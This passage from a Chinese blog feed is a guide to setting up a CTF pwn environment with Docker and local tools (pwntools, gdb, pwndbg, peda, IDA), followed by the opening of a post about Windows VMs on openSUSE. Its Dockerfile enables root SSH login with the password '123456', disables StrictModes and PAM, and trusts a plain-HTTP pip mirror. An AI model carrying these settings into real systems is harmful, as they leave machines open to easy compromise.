class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe \</span><br><span class="language-bash">    LibcSearcher</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu22 .</span><br></code></pre></td></tr></table></figure><p>完成之后你便拥有了一个名为 <code>pwnenv_ubuntu22</code> 的带有做题环境的 Ubuntu22 镜像，可以通过 <code>docker images</code> 指令查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span>                                              <br>REPOSITORY               TAG         IMAGE ID       CREATED          SIZE                                     <br>pwnenv_ubuntu22          latest      c129ca086a72   15 seconds ago   2.81GB<br></code></pre></td></tr></table></figure><p>你也可以根据需求修改第一行的基镜像，从而创建基于不同 Ubuntu 发行版的 docker 镜像。</p><h2 id="从-Docker-镜像创建容器"><a href="#从-Docker-镜像创建容器" class="headerlink" title="从 Docker 镜像创建容器"></a>从 Docker 镜像创建容器</h2><p>我们只需要运行如下命令便能基于我们刚刚创建的 Docker 镜像创建一个新的容器，方便起见你可以将其创建为一个脚本，各参数说明如下：</p><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:2222</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn22</code>： 容器名为 <code>pwn22</code></li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu22</code>：创建容器所使用的镜像</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p 25000:22 \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后通过如下命令便能进入到容器当中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -w /CTF -e TERM=xterm-256color -it pwn22 bash</span><br></code></pre></td></tr></table></figure><p>如果你不想将本地目录与容器进行共享，而是想要将所需文件拷贝一份到容器中，则可以使用 docker cp 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 本地源文件路径 容器名:容器内目的路径</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 容器名:容器内源文件路径 本地目的路径</span><br></code></pre></td></tr></table></figure><p>由于我们为容器设置了 ssh 服务，我们也可以通过 ssh 连接入容器环境，这允许我们使用 vscode 等工具连接到容器内部：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh root@localhost -p 25000</span><br></code></pre></td></tr></table></figure><p>若是容器环境被我们折腾坏了，则可以直接通过 <code>docker rm 容器名</code> 进行删除，之后再重新使用 <code>docker run</code> 创建新容器即可，需要注意的是这种方式会将新拷贝进容器的文件给删除（但不会删除挂载目录）。</p><h2 id="将-Docker-容器接入本地图形界面"><a href="#将-Docker-容器接入本地图形界面" class="headerlink" title="将 Docker 容器接入本地图形界面"></a>将 Docker 容器接入本地图形界面</h2><p>pwntools 自带的调试命令 <code>gdb.attach()</code> 需要创建新的窗口，而在容器中直接运行会失败，因此我们需要为容器接入本地的图形服务，以达成原生的运行效果（直接弹出一个新的窗口）。</p><blockquote><p>若是觉得这种办法比较麻烦，也可以选择使用 tmux 配置多窗口，只需在运行 <code>gdb.attach()</code> 命令前运行 <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code> 即可。</p></blockquote><h3 id="For-Wayland"><a href="#For-Wayland" class="headerlink" title="For Wayland"></a>For Wayland</h3><p>对于 Wayland 环境，在创建容器时我们需要额外附加一些参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    -e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><h3 id="For-X11"><a href="#For-X11" class="headerlink" title="For X11"></a>For X11</h3><p>对于使用 X11 图形服务的，在创建容器时我们则需要附加如下参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><blockquote><p>参考 <a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">Running pwnlib gdb (pwntools) feature inside Docker</a> 。</p></blockquote><h1 id="0x02-在本地直接搭建-CTF-Pwn-做题环境"><a href="#0x02-在本地直接搭建-CTF-Pwn-做题环境" class="headerlink" title="0x02. 在本地直接搭建 CTF Pwn 做题环境"></a>0x02. 在本地直接搭建 CTF Pwn 做题环境</h1><p>除了使用 Docker 之外，你也可以直接在本地搭建做题环境，对于常规的 Linux 用户态 pwn 题目，我们通常仅需要如下软件：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><h2 id="获取-IDA"><a href="#获取-IDA" class="headerlink" title="获取 IDA"></a>获取 IDA</h2><p>IDA Pro（interactive Disassembler Professional）是由 Hex-Rays 公司出品的一款交互式反汇编工具，也是软件逆向工程当中最流行的一个静态分析工具。通过 IDA Pro 我们可以很方便地复原二进制程序的运行逻辑，从而进一步审计出其中存在的漏洞。</p><p><a href="https://hex-rays.com/ida-pro/">IDA Pro</a> 为付费软件，软件本体与不同架构的反编译引擎单独进行收费，你可以根据自己的需求在 Hex-rays 的官网自行购买相应的软件许可证以进行使用。</p><blockquote><p>截至 2024 年 4 月， IDA Pro 本体许可证的价格为 1975 USD，任一指令集架构反编译功能的许可证价格为 2765 USD。</p></blockquote><p>此外，Hex-rays 公司还提供基于云引擎的免费逆向工具 <a href="https://hex-rays.com/ida-free/">IDA Free</a>，目前仅支持 x86 逆向，不过对于绝大部分 CTF 中 Linux 下的用户态 Pwn 题目而言通常已足够使用。</p><h2 id="安装-Python"><a href="#安装-Python" class="headerlink" title="安装 Python"></a>安装 Python</h2><p>绝大部分 Linux 发行版目前已经自带 Python 运行环境，因此通常我们并不需要手动安装 Python。。若你的计算机上不存在 Python 运行环境，则可以根据自己所使用的发行版手动使用包管理器进行安装。</p><p>需要注意的是，部分 Linux 发行版中 Python 版本默认为 Python2，因此你可能需要手动指定安装 Python3。</p><h2 id="配置-venv-python-环境（可选）"><a href="#配置-venv-python-环境（可选）" class="headerlink" title="配置 venv python 环境（可选）"></a>配置 venv python 环境（可选）</h2><p>在部分 Linux 发行版上（如 <code>openSUSE Tumbleweed</code> ）使用 <code>pip</code> 命令时，你可能会遇到如下报错，这是由于发行版自身安全策略限制的缘故：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">error: externally-managed-environment<br><br>× This environment is externally managed<br>╰─&gt; To install Python packages <span class="hljs-keyword">system</span>-wide, <span class="hljs-keyword">try</span><br>    zypper install python311-xyz, where xyz is <span class="hljs-keyword">the</span> package<br>    you are trying <span class="hljs-built_in">to</span> install.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python package,<br>    <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> virtual environment <span class="hljs-keyword">using</span> python3<span class="hljs-number">.11</span> -m venv path/<span class="hljs-built_in">to</span>/venv.<br>    Then use path/<span class="hljs-built_in">to</span>/venv/bin/python <span class="hljs-keyword">and</span> path/<span class="hljs-built_in">to</span>/venv/bin/pip.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python application,<br>    <span class="hljs-keyword">it</span> may be easiest <span class="hljs-built_in">to</span> use `pipx install xyz`, which will manage <span class="hljs-keyword">a</span><br>    virtual environment <span class="hljs-keyword">for</span> you. Install pipx via `zypper install python311-pipx` .<br><br>note: If you believe this is <span class="hljs-keyword">a</span> mistake, please contact your Python installation <span class="hljs-keyword">or</span> OS distribution provider. You can override this, <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> risk <span class="hljs-keyword">of</span> breaking your Python installation <span class="hljs-keyword">or</span> OS, <span class="hljs-keyword">by</span> passing <span class="hljs-comment">--break-system-packages.</span><br></code></pre></td></tr></table></figure><p>对于这种情况，我们可以选择使用 <a href="https://docs.python.org/zh-cn/3/library/venv.html#module-venv">venv</a> 模块创建“虚拟环境”。虚拟环境在默认情况下与其他虚拟环境中的软件以及操作系统中安装的 Python 解释器和库保持隔离，这确保了软件包安装的安全性，且使得我们能够简单地删除并从头开始重建环境。</p><p>我们可以通过如下命令创建一个新的虚拟环境（若路径不存在，则将被创建）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv 自定义的venv文件夹路径<br></code></pre></td></tr></table></figure><p>完成创建之后，我们便可以通过 <code>source</code> 命令进入到 venv 中，请根据你所使用的 shell 进行选择其中之一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">source 自定义的venv文件夹路径/bin/activate         # for bash<br>source 自定义的venv文件夹路径/bin/activate.fish     # for fish<br>source 自定义的venv文件夹路径/bin/activate.csh     # for csh/tcsh<br></code></pre></td></tr></table></figure><blockquote><p>你也可以选择将这条命令加入到 <code>~/.bashrc</code> 文件中，从而在打开 shell 时默认执行。</p></blockquote><p>由于虚拟环境具有轻量、安全、可重构建的特性，因此即便是在你的计算机上并不存在安全策略限制，我们也更推荐你为 CTF&#x2F;Pwn 创建一个单独的 Python 虚拟环境。</p><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><p><a href="https://docs.pwntools.com/en/stable/">pwntools</a> 是一个强大的 Python 软件包，其为我们提供了基本的 pwn 脚本编写环境，以及各类方便的利用工具，在安装好 Python 以及 pip 之后你可以很方便地使用如下指令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>之后在 Python 中便能很方便地通过 <code>from pwn import *</code> 指令使用该包中的各类工具，你也可以使用 <code>from pwn import 名字</code> 来仅导入所需的特定工具，或是使用 <code>import pwn</code> 导入包名后通过 <code>pwn.名字</code> 来使用对应的工具。</p><h2 id="安装-gdb"><a href="#安装-gdb" class="headerlink" title="安装 gdb"></a>安装 gdb</h2><p>GNU Debugger（GDB）是 GNU 项目开发的软件调试器，使用 gdb 我们可以很方便地对二进制程序进行动态调试。</p><p>gdb 在绝大部分 Linux 发行版上都已默认安装，你可以在 shell 中输入 <code>gdb</code> 命令进行确认（输入 <code>q</code> 退出）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb</span><br>GNU gdb (GDB; SUSE Linux Enterprise 15) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-suse-linux&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://bugs.opensuse.org/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.<br>(gdb) <br></code></pre></td></tr></table></figure><p>若你的计算机尚未安装 gdb，则可以使用如下命令进行安装，请自行分辨你所使用的发行版。</p><p>Debian &#x2F; Ubuntu:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install -y gdb<br></code></pre></td></tr></table></figure><p>openSUSE Leap &#x2F; Tumbleweed &#x2F; SLE:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install gdb<br></code></pre></td></tr></table></figure><p>Arch Linux &#x2F; Manjaro &#x2F; EndeavourOS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yay -S gdb # 若未配置 AUR，你也可以使用 pacman -S gdb 进行安装<br></code></pre></td></tr></table></figure><p>Fedora &#x2F; CentOS &#x2F; RHEL:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install gdb # 事实上，yum 被软链接到 dnf<br></code></pre></td></tr></table></figure><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><p><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> (&#x2F;paʊnˈdiˌbʌɡ&#x2F;) 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>pwndbg 项目自带了安装脚本，因此我们可以很方便地从源码进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>对于使用 nix 包管理器的发行版（如 NixOS），你可以通过如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nix shell github:pwndbg/pwndbg<br>pwndbg ./your-binary<br></code></pre></td></tr></table></figure><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><blockquote><p>注：peda 和 pwndbg 你只需要安装其中之一，由于功能重复，且为了避免插件冲突，我们并不推荐你同时安装这两个插件。</p></blockquote><p><a href="https://github.com/longld/peda">peda</a> 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>peda 插件无需过多配置，我们只需要将源码下载到本地后更新 gdb 配置即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git ~/peda<br>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit<br>echo &quot;DONE! debug your program with gdb and enjoy&quot;<br></code></pre></td></tr></table></figure><h1 id="0x03-杂项配置"><a href="#0x03-杂项配置" class="headerlink" title="0x03. 杂项配置"></a>0x03. 杂项配置</h1><h2 id="为-Linux-下运行-IDA-配置-desktop-shortcut"><a href="#为-Linux-下运行-IDA-配置-desktop-shortcut" class="headerlink" title="为 Linux 下运行 IDA 配置 desktop shortcut"></a>为 Linux 下运行 IDA 配置 desktop shortcut</h2><p>wine 对于 Windows 各种 API 的重写已经非常成熟了，这使得 IDA Pro 的 Windows 版本（或许也是绝大多数人会使用的版本）能够比较轻松地在 Linux 下运行，对于完全工作在 Linux 下的同学这是一件好事，因为这意味着不需要使用虚拟机来单独运行 IDA Pro</p><p>对于想要为 IDA 创建快捷方式的 Linux Desktop 用户，你可以参考如下模板编写 <code>.desktop</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/env xdg-open</span><br>[Desktop Entry]<br>Name=IDA Pro 7.5<br>Comment=A powerful disassembler and a versatile debugger<br>GenericName=Disassembler<br>Exec=wine /home/arttnba3/Applications/IDA7.5/ida64.exe<br>Icon=/home/arttnba3/Applications/pic/ida64.png<br>Type=Application<br>Categories=Development;<br>Keywords=IDA;<br></code></pre></td></tr></table></figure><p>完成编写后将该文件放到 <code>~/.local/share/applications/</code> 目录下即可：</p><p><img src="https://s2.loli.net/2024/05/15/7UVMnDA6q1eJblK.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;信 Docker ，得永生&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="https://arttnba3.github.io/categories/PWN/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【SUSE.0x00】在 openSUSE 上食用 Win VM</title>
    <link href="https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/"/>
    <id>https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/</id>
    <published>2024-02-27T03:22:58.000Z</published>
    <updated>2024-03-21T20:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>4202 年了，Linux Desktop 还会好吗？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者自从 <code>Win 物理机 + Linux VM</code> 转到 <code>Almost all in Linux</code> 的生活已经过了大半年了，用 openSUSE 也已经小半年了，除了 Nvidia on Wayland 日常撕裂以及盒盖行为设定为 <code>Lock Screen</code> 会醒不来以外似乎还没有太多问题，但除了代码以外的日常生活总感觉不是特别彳亍：</p><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p>笔者比较喜欢使用酷狗音乐进行听歌（ <del>👴一直都是高贵的酷狗年费会员啊</del> ），但是酷狗是没有官方的 Linux 安装包的，使用 wine 兼任层可以跑起来但是笔者捣鼓了大半天都没有声音：(</p><blockquote><p>Arch 社区打的酷狗 AUR 包似乎可以正常播放，但是笔者也没有时间重新弄回 Arch 了，更没有那个闲时间去研究怎么在 SUSE 上弄了</p></blockquote><p>网易云音乐 <em>曾经有 Linux 版，但是用的 deb 打包，而且也非常久没有更新了，现在官网上也下架 Linux 版了</em> 因为笔者不常用网易云所以也没有尝试用 wine 跑过，但以 wine 现在的水平估计也不会好到哪去（</p><blockquote><p>腾讯音乐之类的就没有用过也不太打算尝试了：）</p></blockquote><p>海外的大部分听歌软件像 <a href="https://www.spotify.com/">Spotify</a> 都是有 <a href="https://www.spotify.com/au/download/linux/">Linux 版</a> 的，但是笔者也会听一些非常小众的歌，这些在 Spotify 上都是没有的，上边只有那些国际化大歌曲（ <del>这就不得不提国内很多小众音乐人的含金量了，什么叫世界第一强国啊</del> ）</p><p>但这还不算最要命的，Sportify 有个非常致命且非常 sb 的设计——<strong>电脑端的 Spotify 每听个一两首歌就会插入一段广告来逼你开会员</strong>，这样的产品策略让笔者很难去使用一些比较正面的词汇去进行评价</p><p><img src="https://s2.loli.net/2024/02/21/MRftUv7gSXDbn8I.png" alt="try not to c*m in 30 seconds"></p><h3 id="Office-套件"><a href="#Office-套件" class="headerlink" title="Office 套件"></a>Office 套件</h3><p><a href="https://www.libreoffice.org/discover/libreoffice/">LibreOffice</a> 作为大部分 Linux 发行版都会默认带着的开源 Office 套件，用着感觉虽然还行但是和 Microsoft Office 相比总感觉有哪里差点意思（<del>就是用着总感觉有哪里不得劲</del>），当然临时顶用其实还好但是 <em>直接重启切回 Windows 写文档不好么</em></p><p>——Microsoft Office 虽然没有 Linux 版但是有个网页版，支持在网页进行编辑甚至在网页上完成 PPT 演示的功能，但是网页版的用着总感觉 <em>也还是差点意思</em> ，而且和 native app 相比总感觉有些卡卡的，唯一的优点大概就是 all on cloud 不用担心数据丢失了：</p><p><img src="https://s2.loli.net/2024/02/21/K4tE6BdfTzigPDL.png" alt="临时做个 PPT 演示还行，但是这样为什么不直接用 Windows 呢"></p><blockquote><p>至于国产 Office 套件 <a 